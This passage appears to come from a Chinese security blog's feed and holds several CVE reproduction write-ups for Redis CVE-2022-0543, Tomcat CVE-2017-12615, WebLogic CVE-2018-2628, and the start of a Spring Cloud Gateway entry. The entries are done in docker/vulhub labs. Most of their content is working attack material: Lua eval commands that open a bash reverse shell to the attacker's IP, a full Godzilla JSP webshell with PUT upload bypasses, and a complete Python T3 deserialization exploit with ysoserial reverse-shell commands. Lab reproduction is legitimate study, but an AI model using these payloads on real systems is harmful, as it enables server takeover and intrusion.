+<p><img src="/2026/02/08/CVE-2022-0543/1773550592914.png" alt="1773550592914"></p>
+<p>安装工具 redis</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo yum install redis -y</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2022-0543/1773550685149.png" alt="1773550685149"></p>
+<p>拦截靶机</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">redis-cli -h 靶机ip</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2022-0543/1773550720121.png" alt="1773550720121"></p>
+<p>执行敏感命令</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#执行whoami</span><br><span class="line">eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("whoami", "r"); local res = f:read("*a"); f:close(); return res' 0</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2022-0543/1773582899578.png" alt="1773582899578"></p>
+<p>进行反弹 shell，nc 开启监听</p>
+<p><img src="/2026/02/08/CVE-2022-0543/1773582922673.png" alt="1773582922673"></p>
+<p>执行反弹 shell 命令</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("bash -c \"bash -i &gt;&amp; /dev/tcp/攻击机ip/监听端口 0&gt;&amp;1\"", "r"); f:close();' 0</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2022-0543/1773582986885.png" alt="1773582986885"></p>
+<p>成功连接</p>
+<p><img src="/2026/02/08/CVE-2022-0543/1773583010143.png" alt="1773583010143"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Redis</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tomcat 任意文件写入漏洞 CVE-2017-12615</title>
+    <url>/2026/02/25/CVE-2017-12615/</url>
+    <content><![CDATA[<h2 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h2><ul>
+<li>Apache Tomcat 7.0.0 - 7.0.79</li>
+</ul>
+<h2 id="漏洞类型："><a href="#漏洞类型：" class="headerlink" title="漏洞类型："></a>漏洞类型：</h2><p>任意文件写入漏洞</p>
+<h2 id="操作系统限制："><a href="#操作系统限制：" class="headerlink" title="操作系统限制："></a>操作系统限制：</h2><p>Windows</p>
+<h2 id="配置要求："><a href="#配置要求：" class="headerlink" title="配置要求："></a>配置要求：</h2><ul>
+<li>需开启 readonly = false</li>
+</ul>
+<h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>写入敏感文件，例如用木马 getshell</p>
+<h2 id="利用原理："><a href="#利用原理：" class="headerlink" title="利用原理："></a>利用原理：</h2><p>Windows 特性，在文件名后面加空格、/、::$DATA，系统会自动忽略后缀</p>
+<h2 id="绕过手段："><a href="#绕过手段：" class="headerlink" title="绕过手段："></a>绕过手段：</h2><h3 id="斜杠绕过："><a href="#斜杠绕过：" class="headerlink" title="斜杠绕过："></a>斜杠绕过：</h3><p>PUT /文件名.jsp/</p>
+<p><img src="/2026/02/25/CVE-2017-12615/1773153480147.png" alt="1773153480147"></p>
+<h3 id="空字符绕过："><a href="#空字符绕过：" class="headerlink" title="空字符绕过："></a>空字符绕过：</h3><p>PUT /文件名.jsp%20（空格）</p>
+<p><img src="/2026/02/25/CVE-2017-12615/1773153516967.png" alt="1773153516967"></p>
+<h3 id="NTFS流绕过："><a href="#NTFS流绕过：" class="headerlink" title="NTFS流绕过："></a>NTFS 流绕过：</h3><p>PUT /文件名.jsp::$DATA</p>
+<p><img src="/2026/02/25/CVE-2017-12615/1773153597456.png" alt="1773153597456"></p>
+<h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 拉取dockers镜像，将端口映射到8081，访问公网地址:8081</span></span><br><span class="line">docker run -d -p 8081:8080 --name tomcat-7070 tomcat:7.0.70</span><br><span class="line"><span class="comment"># 镜像默认没开readonly=false，用sed强行改写</span></span><br><span class="line">docker <span class="built_in">exec</span> -it tomcat-7070 sed -i <span class="string">'/&lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;\/servlet-class&gt;/a &lt;init-param&gt;\n&lt;param-name&gt;readonly&lt;\/param-name&gt;\n&lt;param-value&gt;false&lt;\/param-value&gt;\n&lt;\/init-param&gt;'</span> /usr/local/tomcat/conf/web.xml</span><br><span class="line"><span class="comment"># 检查是否插入成功，出现&lt;param-value&gt;false&lt;/param-value&gt;即为成功，不然直接复现漏洞会失败，出现401响应码</span></span><br><span class="line">docker <span class="built_in">exec</span> tomcat-7070 grep -B 5 -A 5 <span class="string">"readonly"</span> /usr/local/tomcat/conf/web.xml</span><br><span class="line"><span class="comment"># 重启容器</span></span><br><span class="line">docker restart tomcat-7070</span><br></pre></td></tr></tbody></table></figure>
+
+<p>用 burpsuite 抓取 http://公网地址: 8081 数据包</p>
+<p><img src="/2026/02/25/CVE-2017-12615/1773153640278.png" alt="1773153640278"></p>
+<p>发送到 Repeater 模块，再修改 Repeater 设置，勾选红框中的选项</p>
+<p><img src="/2026/02/25/CVE-2017-12615/1773153732050.png" alt="1773153732050"></p>
+<p>可以用 jsp 一句话木马文件，这里用哥斯拉生成 jsp 文件</p>
+<p><img src="/2026/02/25/CVE-2017-12615/1773153753543.png" alt="1773153753543"></p>
+<p>有效载荷选 JavaDynamicPayload，再点生成，选择 jsp 文件</p>
+<p><img src="/2026/02/25/CVE-2017-12615/1773153773311.png" alt="1773153773311"></p>
+<p>选择保存路径，并修改文件名字</p>
+<p><img src="/2026/02/25/CVE-2017-12615/1773153792347.png" alt="1773153792347"></p>
+<p>成功生成</p>
+<p><img src="/2026/02/25/CVE-2017-12615/1773153810890.png" alt="1773153810890"></p>
+<p>复制源代码</p>
+<figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;%! String xc=<span class="string">"3c6e0b8a9c15224a"</span>; String pass=<span class="string">"pass"</span>; String md5=md5(pass+xc); <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>{<span class="keyword">public</span> <span class="title function_">X</span><span class="params">(ClassLoader z)</span>{<span class="built_in">super</span>(z);}<span class="keyword">public</span> Class <span class="title function_">Q</span><span class="params">(<span class="type">byte</span>[] cb)</span>{<span class="keyword">return</span> <span class="built_in">super</span>.defineClass(cb, <span class="number">0</span>, cb.length);} }<span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s,<span class="type">boolean</span> m){ <span class="keyword">try</span>{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(<span class="string">"AES"</span>);c.init(m?<span class="number">1</span>:<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(),<span class="string">"AES"</span>));<span class="keyword">return</span> c.doFinal(s); }<span class="keyword">catch</span> (Exception e){<span class="keyword">return</span> <span class="literal">null</span>; }} <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">md5</span><span class="params">(String s)</span> {<span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="keyword">try</span> {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(<span class="string">"MD5"</span>);m.update(s.getBytes(), <span class="number">0</span>, s.length());ret = <span class="keyword">new</span> <span class="title class_">java</span>.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();} <span class="keyword">catch</span> (Exception e) {}<span class="keyword">return</span> ret; } <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception {Class base64;<span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="keyword">try</span> {base64=Class.forName(<span class="string">"java.util.Base64"</span>);<span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">"getEncoder"</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);value = (String)Encoder.getClass().getMethod(<span class="string">"encodeToString"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] { <span class="type">byte</span>[].class }).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] { bs });} <span class="keyword">catch</span> (Exception e) {<span class="keyword">try</span> { base64=Class.forName(<span class="string">"sun.misc.BASE64Encoder"</span>); <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.newInstance(); value = (String)Encoder.getClass().getMethod(<span class="string">"encode"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] { <span class="type">byte</span>[].class }).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] { bs });} <span class="keyword">catch</span> (Exception e2) {}}<span class="keyword">return</span> value; } <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] base64Decode(String bs) <span class="keyword">throws</span> Exception {Class base64;<span class="type">byte</span>[] value = <span class="literal">null</span>;<span class="keyword">try</span> {base64=Class.forName(<span class="string">"java.util.Base64"</span>);<span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">"getDecoder"</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);value = (<span class="type">byte</span>[])decoder.getClass().getMethod(<span class="string">"decode"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] { String.class }).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] { bs });} <span class="keyword">catch</span> (Exception e) {<span class="keyword">try</span> { base64=Class.forName(<span class="string">"sun.misc.BASE64Decoder"</span>); <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.newInstance(); value = (<span class="type">byte</span>[])decoder.getClass().getMethod(<span class="string">"decodeBuffer"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] { String.class }).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] { bs });} <span class="keyword">catch</span> (Exception e2) {}}<span class="keyword">return</span> value; }%&gt;&lt;%</span><br><span class="line"><span class="keyword">try</span>{</span><br><span class="line"><span class="type">byte</span>[] data=base64Decode(request.getParameter(<span class="string">"pass"</span>));</span><br><span class="line">data=x(data, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span>(data!=<span class="literal">null</span>){</span><br><span class="line">X x=<span class="keyword">new</span> <span class="title class_">X</span>(<span class="built_in">this</span>.getClass().getClassLoader());</span><br><span class="line">Class&lt;?&gt; c=x.Q(data);</span><br><span class="line">Object o=c.newInstance();</span><br><span class="line">out.print(base64Encode(x(o,<span class="literal">true</span>)));</span><br><span class="line">}</span><br><span class="line">}<span class="keyword">catch</span> (Exception e){}</span><br><span class="line">%&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>修改包文，请求头改为 PUT，绕过手段这里选用斜杠绕过，最后放 jsp 源码</p>
+<p><img src="/2026/02/25/CVE-2017-12615/1773153842406.png" alt="1773153842406"></p>
+<p>返回包文的响应码为 201 即成功</p>
+<p><img src="/2026/02/25/CVE-2017-12615/1773153878002.png" alt="1773153878002"></p>
+<p>将 http://公网地址: 8081/上传的文件名.jsp 放到哥斯拉连接</p>
+<p><img src="/2026/02/25/CVE-2017-12615/1773153909466.png" alt="1773153909466"></p>
+<h2 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h2><ol>
+<li><strong>升级版本</strong>：升级到 Apache Tomcat 7.0.80 或更高版本</li>
+<li><strong>保持默认配置</strong>：保持 readonly = true 配置（默认值）</li>
+<li><strong>限制 HTTP 方法</strong>：在 Web 服务器或应用层限制 PUT 方法的使用</li>
+<li><strong>文件系统权限</strong>：严格控制 Tomcat 目录的写入权限</li>
+<li><strong>WAF 防护</strong>：部署 Web 应用防火墙，拦截可疑的文件上传请求</li>
+</ol>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>CVE-2017-12615 是一个影响 Apache Tomcat 7.0.0-7.0.79 版本的任意文件写入漏洞，仅在 Windows 操作系统上存在。该漏洞利用 Windows 文件系统的特性，通过在文件名后添加特殊字符（如斜杠、空格、::$DATA）来绕过 Tomcat 的文件扩展名检查，从而上传恶意 JSP 文件。</p>
+<p>修复该漏洞的最佳方法是升级到最新版本的 Tomcat，并保持 readonly = true 的默认配置。同时，加强服务器的访问控制和监控，及时发现并阻止可疑的文件上传行为。</p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Tomcat</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Weblogic 命令执行漏洞 CVE-2018-2628</title>
+    <url>/2026/02/07/CVE-2018-2628/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>WebLogic 10.3.6.0.0</li>
+<li>WebLogic 12.1.3.0.0</li>
+<li>WebLogic 12.2.1.2.0</li>
+<li>WebLogic 12.2.1.3.0</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>Java 反序列化</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><ul>
+<li>对外开放 7001</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，反弹 shell</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>WebLogic 为防范反序列化设置黑名单，sun.rmi.server.UniicasetRef 不在黑名单内，T3 协议是 WebLogic 独有的通信协议，主要用于不同 Java 虚拟机之间传输对象，WebLogic 默认所以端口都支持 T3，攻击者通过 T3 协议把精心构造的 UnicastRef 序列化对象发给 WebLogic，WebLogic 反序列化对象时，会作为 JRMP 客户端主动连接攻击者服务器，攻击者服务器下发恶意 payload，此时 WebLogic，是通过 JRMP 协议进行数据传输，从而绕过最外层的 T3 协议过滤器</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/weblogic/CVE-2018-2628</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/07/CVE-2018-2628/1773400261426.png" alt="1773400261426"></p>
+<p>下载攻击工具并检查是否有 Java 环境</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ysoserial.jar</span><br><span class="line">#检查Java环境</span><br><span class="line">java -version</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/07/CVE-2018-2628/1773400307472.png" alt="1773400307472"></p>
+<p>运行命令</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 监听端口 CommonsCollections1 执行的命令</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/07/CVE-2018-2628/1773400408672.png" alt="1773400408672"></p>
+<p>创建攻击脚本 exploit.py</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">from __future__ import print_function</span><br><span class="line">import binascii</span><br><span class="line">import os</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</span><br><span class="line">    # 生成 ysoserial payload 并转换为十六进制字符串</span><br><span class="line">    command = 'java -jar {} {} {}:{} &gt; payload.out'.format(path_ysoserial, jrmp_client, jrmp_listener_ip, jrmp_listener_port)</span><br><span class="line">    print("[*] 生成 Payload 命令: " + command)</span><br><span class="line">    os.system(command)</span><br><span class="line">    if not os.path.exists('payload.out'):</span><br><span class="line">        print("[!] 错误: payload.out 未生成，请检查 java 环境及 ysoserial 路径")</span><br><span class="line">        sys.exit()</span><br><span class="line">    with open('payload.out', 'rb') as f:</span><br><span class="line">        bin_file = f.read()</span><br><span class="line">    # Python 3 中 hexlify 返回 bytes，需要 decode 为字符串</span><br><span class="line">    return binascii.hexlify(bin_file).decode('ascii')</span><br><span class="line"></span><br><span class="line">def t3_handshake(sock, server_addr):</span><br><span class="line">    sock.connect(server_addr)</span><br><span class="line">    # T3 协议握手包</span><br><span class="line">    handshake = binascii.a2b_hex('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a')</span><br><span class="line">    sock.send(handshake)</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    res = sock.recv(1024)</span><br><span class="line">    if b'HELO' in res:</span><br><span class="line">        print('[+] T3 握手成功!')</span><br><span class="line">    else:</span><br><span class="line">        print('[!] T3 握手可能失败，收到响应: ', res)</span><br><span class="line"></span><br><span class="line">def build_t3_request_object(sock, port):</span><br><span class="line">    data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'</span><br><span class="line">    # 注入端口号</span><br><span class="line">    data2_hex = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(port))</span><br><span class="line">    data3 = '1a7727000d3234322e323134'</span><br><span class="line">    data4 = '2e312e32353461863d1d0000000078'</span><br><span class="line">    </span><br><span class="line">    for d in [data1, data2_hex, data3, data4]:</span><br><span class="line">        sock.send(binascii.a2b_hex(d))</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print('[+] 发送 T3 请求对象成功, 接收长度: %d' % (len(sock.recv(2048))))</span><br><span class="line"></span><br><span class="line">def send_payload_objdata(sock, data):</span><br><span class="line">    # data 为十六进制字符串。请注意：这里的 payload_prefix 和 payload_suffix 必须是完整的长字符串，不能断行。</span><br><span class="line">    payload_prefix = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'</span><br><span class="line">    payload_suffix = 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'</span><br><span class="line">    </span><br><span class="line">    full_payload = payload_prefix + data + payload_suffix</span><br><span class="line">    # 计算长度头</span><br><span class="line">    length = '{:08x}'.format(len(full_payload) // 2 + 4)</span><br><span class="line">    final_packet = binascii.a2b_hex(length + full_payload)</span><br><span class="line">    </span><br><span class="line">    sock.send(final_packet)</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    # 重发确认</span><br><span class="line">    sock.send(final_packet)</span><br><span class="line">    </span><br><span class="line">    res = b''</span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            chunk = sock.recv(4096)</span><br><span class="line">            if not chunk: break</span><br><span class="line">            res += chunk</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br><span class="line">    return res.decode('ascii', errors='ignore')</span><br><span class="line"></span><br><span class="line">def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(15)</span><br><span class="line">    server_addr = (dip, dport)</span><br><span class="line">    try:</span><br><span class="line">        t3_handshake(sock, server_addr)</span><br><span class="line">        build_t3_request_object(sock, dport)</span><br><span class="line">        payload_hex = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br><span class="line">        print("[*] Payload 生成成功 (长度: %d)" % len(payload_hex))</span><br><span class="line">        rs = send_payload_objdata(sock, payload_hex)</span><br><span class="line">        print('[+] 利用尝试完成！请检查 JRMPListener 和 NC 终端。')</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print("[!] 发生错误: ", e)</span><br><span class="line">    finally:</span><br><span class="line">        sock.close()</span><br><span class="line"></span><br><span class="line">if __name__=="__main__":</span><br><span class="line">    if len(sys.argv) != 7:</span><br><span class="line">        print('\n用法:\npython3 exploit.py [靶机IP] [靶机端口] [ysoserial路径] '</span><br><span class="line">              '[JRMP监听IP] [JRMP监听端口] [JRMPClient]\n')</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    dip = sys.argv[1]</span><br><span class="line">    dport = int(sys.argv[2])</span><br><span class="line">    path_ysoserial = sys.argv[3]</span><br><span class="line">    jrmp_listener_ip = sys.argv[4]</span><br><span class="line">    jrmp_listener_port = sys.argv[5]</span><br><span class="line">    jrmp_client = sys.argv[6]</span><br><span class="line">    exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/07/CVE-2018-2628/1773400451085.png" alt="1773400451085"></p>
+<p>运行攻击脚本</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python3 exploit.py 靶机ip 7001 ysoserial.jar 攻击机ip ysoserial监听的端口 JRMPClient</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/07/CVE-2018-2628/1773400505342.png" alt="1773400505342"></p>
+<p>运行 ysoserial 窗口有回显</p>
+<p><img src="/2026/02/07/CVE-2018-2628/1773400551030.png" alt="1773400551030"></p>
+<p>进入容器内部查看 tmp 文件夹，发现有 success，说明命令执行成功</p>
+<p><img src="/2026/02/07/CVE-2018-2628/1773400593203.png" alt="1773400593203"></p>
+<p>下面进行 getshell，开启 nc 监听，nc -lvnp 监听端口</p>
+<p><img src="/2026/02/07/CVE-2018-2628/1773400626185.png" alt="1773400626185"></p>
+<p>使用 ysoserial 攻击执行反弹 shell 命令</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'bash -c {echo,反弹shell的base64编码}|{base64,-d}|{bash,-i}'</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/07/CVE-2018-2628/1773400661414.png" alt="1773400661414"></p>
+<p>运行攻击脚本</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python3 exploit.py 靶机ip 7001 ysoserial.jar 攻击机ip ysoserial监听的端口 JRMPClient</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/07/CVE-2018-2628/1773400714904.png" alt="1773400714904"></p>
+<p>运行 ysoserial 窗口有回显</p>
+<p><img src="/2026/02/07/CVE-2018-2628/1773400763975.png" alt="1773400763975"></p>
+<p>成功连接，虽然不稳定</p>
+<p><img src="/2026/02/07/CVE-2018-2628/1773400811191.png" alt="1773400811191"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>WebLogic</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Spring Cloud Gateway 远程代码执行漏洞 CVE-2022-22947</title>
+    <url>/2026/02/04/CVE-2022-22947/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Spring Cloud Gateway 3.1.x - 3.1.1</li>
+<li>Spring Cloud Gateway 3.0.x - 3.0.7</li>
+<li>旧版本 / 停止维护版本</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>SpEL 表达式注入</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，进行反弹 shell，写入内存马（删除路由后还能驻留在内存中）</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Spring Cloud Gateway 提供了一个管理端点（/actuator/gateway/routes），允许管理员通过 HTTP 请求动态地添加、删除或修改路由配置，该端点暴露且未受保护，攻击者可以发送 POST 请求来定义新的路由，并在 filters 参数注入恶意代码，网关价值配置时候，会调用 ShortcutConfigurable 接口，该接口会将 filters 参数的值传给 SpEL 解析引擎。利用链分两个阶段，第一阶段为存储阶段，攻击者通过 T () 操作符调用 Java 环境敏感类来构造恶意代码，此时恶意代码仅仅作为字符串存在网关内存配置；第二阶段为触发阶段，加载过程网关会解析恶意表达式，解析成功后 Runtime.exec() 被调用，在服务器执行系统命令</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
